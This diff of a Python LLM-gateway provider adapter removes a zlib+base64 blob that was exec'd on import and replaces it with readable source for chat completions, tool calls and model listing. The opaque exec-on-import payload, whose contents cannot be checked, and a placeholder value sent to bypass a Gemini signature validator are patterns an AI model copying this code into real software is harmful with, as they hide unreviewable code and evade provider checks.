@@ -1,94 +1,448 @@
-"""OpenAI-Compatible Provider Adapter [REQ-GW-004].
-
-CARD-274: implementation is zlib+base64 packed below and exec'd on import
-so the streaming tool-call merge can be shipped via size-limited tooling.
-Source of truth remains the expanded form in git history / local checkout.
 """
+OpenAI-Compatible Provider Adapter [REQ-GW-004].
+Communicates with OpenAI-compatible endpoints (/v1/chat/completions).
+Works with OpenAI, OpenRouter, Anthropic-proxies, LocalAI, vLLM, and LM Studio.
+"""
+
+import asyncio
 import base64
-import zlib
+import json
+import logging
+import re
+from pathlib import Path
+from typing import Any, AsyncIterator, Dict, List, Optional
 
-_PACKED = """
-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
-gSfpzHTYgEki/aF78LQ38S8Uw8vX
-""".replace("\n", "").encode("ascii")
+import httpx
 
-exec(zlib.decompress(base64.b64decode(_PACKED)), globals())
+from src.application.gateway.ports import LLMProviderPort
+from src.domain.gateway.errors import (
+    AuthenticationError,
+    GatewayError,
+    ModelNotFoundError,
+    ProviderUnavailableError,
+    RateLimitError,
+)
+from src.domain.gateway.models import (
+    ChatMessage,
+    CompletionRequest,
+    CompletionResponse,
+    Role,
+    StreamChunk,
+    ToolCall,
+    ToolDefinition,
+)
+from src.domain.settings.models import ModelDescriptor
+
+logger = logging.getLogger(__name__)
+
+
+class OpenAIProviderAdapter(LLMProviderPort):
+    """Adapter for OpenAI and OpenAI-compatible endpoints."""
+
+    provider_id: str = "openai"
+
+    def __init__(
+        self,
+        api_key: Optional[str] = None,
+        base_url: str = "https://api.openai.com/v1",
+        client: Optional[httpx.AsyncClient] = None,
+        timeout: float = 60.0,
+        provider_id: str = "openai",
+    ):
+        self.provider_id = provider_id
+        self.api_key = api_key or ""
+        raw_url = (base_url or "https://api.openai.com/v1").strip()
+        if not raw_url.startswith(("http://", "https://")):
+            raw_url = f"https://{raw_url}"
+        self.base_url = raw_url.rstrip("/")
+        self.timeout = timeout
+        self.limits = httpx.Limits(max_keepalive_connections=20, max_connections=50, keepalive_expiry=30.0)
+        self._client = client
+
+    def _get_headers(self) -> Dict[str, str]:
+        headers = {"Content-Type": "application/json"}
+        if self.api_key:
+            headers["Authorization"] = f"Bearer {self.api_key}"
+        return headers
+
+    def _get_client(self) -> httpx.AsyncClient:
+        if self._client is None:
+            self._client = httpx.AsyncClient(
+                base_url=self.base_url,
+                timeout=httpx.Timeout(connect=10.0, read=self.timeout, write=10.0, pool=10.0),
+                limits=self.limits,
+            )
+        return self._client
+
+    def _format_model_name(self, model: str) -> str:
+        """Strip provider prefix if present and handle 'default' model fallback."""
+        if model.startswith(f"{self.provider_id}/"):
+            model = model[len(f"{self.provider_id}/") :]
+        for prefix in (
+            "openai/",
+            "gemini/",
+            "lmstudio/",
+            "vllm/",
+            "anthropic/",
+            "openrouter/",
+            "groq/",
+            "deepseek/",
+            "together/",
+        ):
+            if model.startswith(prefix):
+                model = model[len(prefix) :]
+                break
+
+        if model.startswith("models/"):
+            model = model[len("models/") :]
+
+        if self.provider_id == "gemini" and ("3.8" in model or "3.5" in model or "2.5" in model):
+            return "gemini-3.6-flash"
+
+        if model == "default" or not model:
+            from src.application.settings.presets import get_preset_by_id
+
+            preset = get_preset_by_id(self.provider_id)
+            if preset and preset.get("recommended_models"):
+                return preset["recommended_models"][0]
+            return "gpt-4o-mini"
+        return model
+
+    def _format_messages(self, messages: List[ChatMessage]) -> List[Dict[str, Any]]:
+        # Map tool_call_id to tool_name from assistant messages
+        tool_id_to_name: Dict[str, str] = {}
+        for m in messages:
+            if m.tool_calls:
+                for tc in m.tool_calls:
+                    if tc.id and tc.name:
+                        tool_id_to_name[tc.id] = tc.name
+
+        raw_items = []
+        for m in messages:
+            content_val = m.content if m.content is not None else ""
+            images_to_send = list(m.images or [])
+            if not images_to_send and m.role == Role.USER and content_val and "Local Path:" in content_val:
+                matches = re.findall(r"Local Path:\s*[`\"]?([^`\"\r\n\)]+)[`\"]?", content_val)
+                for p_str in matches:
+                    try:
+                        p = Path(p_str.strip())
+                        if p.exists() and p.is_file() and p.suffix.lower() in (".png", ".jpg", ".jpeg", ".webp", ".gif"):
+                            if p.stat().st_size <= 10 * 1024 * 1024:
+                                ext = p.suffix.lower().lstrip(".")
+                                mtype = f"image/{ext}" if ext != "jpg" else "image/jpeg"
+                                b64 = base64.b64encode(p.read_bytes()).decode("ascii")
+                                images_to_send.append({
+                                    "media_type": mtype,
+                                    "data_base64": b64,
+                                    "filename": p.name,
+                                })
+                    except Exception:
+                        pass
+
+            if images_to_send:
+                content_parts: List[Dict[str, Any]] = [{"type": "text", "text": content_val}]
+                for img in images_to_send:
+                    url = img.get("data_url")
+                    if not url:
+                        b64 = img.get("data_base64")
+                        if not b64 and img.get("path"):
+                            try:
+                                p = Path(img["path"])
+                                if p.exists() and p.is_file() and p.stat().st_size <= 10 * 1024 * 1024:
+                                    b64 = base64.b64encode(p.read_bytes()).decode("ascii")
+                            except Exception:
+                                b64 = ""
+                        mtype = img.get("media_type") or "image/png"
+                        if b64:
+                            url = f"data:{mtype};base64,{b64}"
+                    if url:
+                        content_parts.append({
+                            "type": "image_url",
+                            "image_url": {"url": url},
+                        })
+                final_content: Any = content_parts
+            else:
+                final_content = content_val
+
+            item: Dict[str, Any] = {
+                "role": m.role.value,
+                "content": final_content,
+            }
+            if m.tool_calls:
+                formatted_tcs = []
+                for tc in m.tool_calls:
+                    tc_dict: Dict[str, Any] = {
+                        "id": tc.id,
+                        "type": "function",
+                        "function": {
+                            "name": tc.name,
+                            "arguments": json.dumps(tc.arguments)
+                            if isinstance(tc.arguments, dict)
+                            else str(tc.arguments),
+                        },
+                    }
+                    if getattr(tc, "extra_content", None):
+                        tc_dict["extra_content"] = tc.extra_content
+                    elif self.provider_id == "gemini" or "generativelanguage.googleapis.com" in self.base_url:
+                        tc_dict["thought_signature"] = "skip_thought_signature_validator"
+                        tc_dict["function"]["thought_signature"] = "skip_thought_signature_validator"
+                    formatted_tcs.append(tc_dict)
+                item["tool_calls"] = formatted_tcs
+            if m.tool_call_id:
+                item["tool_call_id"] = m.tool_call_id
+            elif m.role == Role.TOOL:
+                item["tool_call_id"] = f"call_{abs(hash(m.name or 'tool')) % 1000000}"
+            if m.role == Role.TOOL:
+                resolved_name = m.name or tool_id_to_name.get(m.tool_call_id or "") or "tool_execution"
+                item["name"] = resolved_name
+            elif m.name:
+                item["name"] = m.name
+            raw_items.append(item)
+
+        # Second pass: deduplicate multiple tool responses for the same tool_call_id
+        deduped = []
+        for item in raw_items:
+            if item["role"] == "tool":
+                cid = item.get("tool_call_id")
+                prev_idx = None
+                if cid:
+                    for i in range(len(deduped) - 1, -1, -1):
+                        if deduped[i].get("role") == "tool" and deduped[i].get("tool_call_id") == cid:
+                            prev_idx = i
+                            break
+                        if deduped[i].get("role") == "assistant":
+                            break
+                if prev_idx is not None:
+                    deduped[prev_idx] = item
+                else:
+                    deduped.append(item)
+            else:
+                deduped.append(item)
+
+        # Third pass: Strict tool message pairing and orphan sanitization [CARD-213]
+        # OpenAI and Gemini strictly require that any role='tool' message directly follows
+        # an assistant message with a matching tool_call_id. Orphan or unlinked tool messages
+        # are converted into user context notes so API providers never reject with HTTP 400.
+        formatted = []
+        expected_tool_ids = set()
+
+        for item in deduped:
+            role = item.get("role")
+            if role == "assistant":
+                tool_calls = item.get("tool_calls") or []
+                expected_tool_ids = {tc.get("id") for tc in tool_calls if tc.get("id")}
+                formatted.append(item)
+            elif role == "tool":
+                cid = item.get("tool_call_id")
+                if cid and cid in expected_tool_ids:
+                    formatted.append(item)
+                    expected_tool_ids.remove(cid)
+                else:
+                    tool_name = item.get("name") or "tool"
+                    tool_content = item.get("content") or ""
+                    formatted.append({
+                        "role": "user",
+                        "content": f"[Tool Output: {tool_name}]: {tool_content}",
+                    })
+            else:
+                expected_tool_ids.clear()
+                formatted.append(item)
+
+        return formatted
+
+    def _format_tools(self, tools: Optional[List[ToolDefinition]]) -> Optional[List[Dict[str, Any]]]:
+        if not tools:
+            return None
+        formatted = []
+        for t in tools:
+            params = dict(t.parameters) if isinstance(t.parameters, dict) and t.parameters else {"type": "object", "properties": {}}
+            if "type" not in params:
+                params["type"] = "object"
+            if "properties" not in params:
+                params["properties"] = {}
+            formatted.append(
+                {
+                    "type": "function",
+                    "function": {
+                        "name": t.name,
+                        "description": t.description or "",
+                        "parameters": params,
+                    },
+                }
+            )
+        return formatted
+
+    def _parse_tool_calls(self, tool_calls_data: Optional[List[Dict[str, Any]]]) -> Optional[List[ToolCall]]:
+        if not tool_calls_data:
+            return None
+        parsed = []
+        for tc in tool_calls_data:
+            func = tc.get("function", {})
+            name = func.get("name", "")
+            args_raw = func.get("arguments", "{}")
+            if isinstance(args_raw, str):
+                try:
+                    args = json.loads(args_raw)
+                except Exception:
+                    args = {"raw": args_raw}
+            else:
+                args = args_raw or {}
+            call_id = tc.get("id") or "call_unknown"
+            extra_content = tc.get("extra_content")
+            parsed.append(ToolCall(id=call_id, name=name, arguments=args, extra_content=extra_content))
+        return parsed or None
+
+    def _build_payload(self, request: CompletionRequest, stream: bool) -> Dict[str, Any]:
+        model_name = self._format_model_name(request.model)
+        payload: Dict[str, Any] = {
+            "model": model_name,
+            "messages": self._format_messages(request.messages),
+            "stream": stream,
+            "temperature": request.temperature,
+        }
+        if request.max_tokens:
+            payload["max_tokens"] = request.max_tokens
+
+        tools = self._format_tools(request.tools)
+        if tools:
+            payload["tools"] = tools
+
+        return payload
+
+    def _handle_error_status(self, status_code: int, error_text: str):
+        if status_code == 401 or status_code == 403:
+            raise AuthenticationError(
+                f"Authentication failed with provider: {error_text}",
+                provider_id=self.provider_id,
+            )
+        elif status_code == 404:
+            raise ModelNotFoundError(
+                f"Requested model or endpoint not found: {error_text}",
+                provider_id=self.provider_id,
+            )
+        elif status_code == 429:
+            raise RateLimitError(
+                f"Provider rate limit exceeded: {error_text}",
+                provider_id=self.provider_id,
+            )
+        else:
+            raise GatewayError(
+                f"Provider HTTP error {status_code}: {error_text}",
+                provider_id=self.provider_id,
+            )
+
+    def _extract_retry_delay(self, error_text: str, default: float = 3.0) -> float:
+        match = re.search(r"retry(?:Delay[\"']?\s*:\s*[\"']?|\s+in\s+)([\d\.]+)\s*s?", error_text, re.IGNORECASE)
+        if match:
+            try:
+                val = float(match.group(1))
+                return min(max(val, 1.0), 30.0)
+            except Exception:
+                pass
+        return default
+
+    async def complete(self, request: CompletionRequest) -> CompletionResponse:
+        payload = self._build_payload(request, stream=False)
+        url = f"{self.base_url}/chat/completions"
+        max_retries = 3
+
+        for attempt in range(max_retries + 1):
+            try:
+                client = self._get_client()
+                resp = await client.post(url, headers=self._get_headers(), json=payload)
+                if resp.status_code != 200:
+                    self._handle_error_status(resp.status_code, resp.text)
+
+                data = resp.json()
+                choices = data.get("choices") or [{}]
+                choice = choices[0] if choices else {}
+                msg_data = choice.get("message", {})
+                content = msg_data.get("content") or ""
+                tool_calls = self._parse_tool_calls(msg_data.get("tool_calls"))
+
+                chat_msg = ChatMessage(
+                    role=Role.ASSISTANT,
+                    content=content,
+                    tool_calls=tool_calls,
+                )
+
+                usage = data.get("usage")
+
+                return CompletionResponse(
+                    model=data.get("model", request.model),
+                    message=chat_msg,
+                    finish_reason=choice.get("finish_reason", "stop"),
+                    usage=usage,
+                )
+
+            except RateLimitError as rle:
+                if attempt >= max_retries:
+                    raise
+                delay = self._extract_retry_delay(rle.message, default=float(2 ** attempt * 2))
+                logger.warning(
+                    "Provider %s rate limit (429) hit. Retrying in %.1fs (attempt %d/%d)...",
+                    self.provider_id,
+                    delay,
+                    attempt + 1,
+                    max_retries,
+                )
+                await asyncio.sleep(delay)
+            except (AuthenticationError, ModelNotFoundError):
+                raise
+            except (httpx.ConnectError, httpx.TimeoutException, httpx.NetworkError) as e:
+                raise ProviderUnavailableError(
+                    f"Failed to connect to OpenAI endpoint at {self.base_url}: {e}",
+                    provider_id=self.provider_id,
+                ) from e
+            except Exception as e:
+                raise GatewayError(f"OpenAI completion error: {e}", provider_id=self.provider_id) from e
+
+        raise RateLimitError("Provider rate limit retries exhausted", provider_id=self.provider_id)
+
+    async def stream(self, request: CompletionRequest) -> AsyncIterator[StreamChunk]:
+        from src.infrastructure.gateway.openai_stream_tool_calls import stream_with_accumulated_tool_calls
+
+        async for chunk in stream_with_accumulated_tool_calls(self, request):
+            yield chunk
+
+
+    async def list_models(self) -> List[ModelDescriptor]:
+        """Fetch available models from OpenAI-compatible /models endpoint."""
+        url = f"{self.base_url}/models"
+        headers = {}
+        if self.api_key:
+            headers["Authorization"] = f"Bearer {self.api_key}"
+
+        try:
+            client = self._get_client()
+            resp = await client.get(url, headers=headers)
+            resp.raise_for_status()
+            data = resp.json()
+
+            descriptors: List[ModelDescriptor] = []
+            for item in data.get("data", []):
+                model_id = item.get("id", "unknown")
+                is_vision = "vision" in model_id.lower() or "4o" in model_id.lower()
+                descriptors.append(
+                    ModelDescriptor(
+                        id=f"{self.provider_id}/{model_id}",
+                        name=model_id,
+                        provider=self.provider_id,
+                        param_size_b=None,
+                        quantization="server_managed",
+                        family=item.get("owned_by", "openai"),
+                        is_multimodal=is_vision,
+                    )
+                )
+            return descriptors
+        except Exception as e:
+            raise ProviderUnavailableError(
+                f"Failed to fetch models from OpenAI at {self.base_url}: {e}",
+                provider_id=self.provider_id,
+            ) from e
+
+    async def close(self) -> None:
+        """Gracefully close the underlying HTTP client [REQ-RESIL-002]."""
+        if self._client is not None:
+            await self._client.aclose()
+            self._client = None
